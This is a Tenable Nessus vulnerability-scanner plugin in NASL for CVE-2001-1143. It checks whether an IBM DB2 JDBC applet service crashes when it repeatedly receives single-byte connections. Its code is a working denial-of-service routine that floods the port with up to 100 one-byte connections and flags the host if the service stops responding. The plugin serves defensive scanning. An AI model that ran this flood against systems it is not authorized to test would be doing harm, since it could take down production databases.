#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10871);
 script_version("$Revision: 1.20 $");
 script_cvs_date("$Date: 2016/10/10 15:57:04 $");

 script_cve_id("CVE-2001-1143");
 script_bugtraq_id(3010);
 script_osvdb_id(9486, 9487);

 script_name(english:"IBM DB2 Multiple CGI Single Byte Request Remote DoS");
 script_summary(english:"Flood against the remote service.");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote database service is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to crash the IBM DB2 database service by connecting
to the affected service and sending just one byte to it." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2001/Jul/189" );
 script_set_attribute(attribute:"solution", value:
"Contact the vendor for a patch." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/03/06");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/07/11");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:db2");
 script_end_attributes();
 
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
 script_family(english:"Databases");
 script_dependencies("db2_jdbc_applet_server_detect.nasl");
 script_require_ports("Services/db2_jd");
 exit(0);
}

include("global_settings.inc");

function test_db2_port(port)
{
 local_var soc, i;

 if (! get_port_state(port))
  return(0);

 soc = open_sock_tcp(port);
 if (!soc)
  return(0);
 for (i=0; i<100; i=i+1)
 {
  send(socket:soc, data:string("x"));
  close(soc);

  soc = open_sock_tcp(port);
  if (! soc)
  {
   sleep(1);
   soc = open_sock_tcp(port);
   if (! soc)
   {
    security_warning(port);
    return (1);
   }
  }
 }
 close(soc);
 return(1);
}

port = get_kb_item("Services/db2_jd");
if (!port) exit(0);

test_db2_port(port:port);
if (report_paranoia > 1) test_db2_port(port:6790);
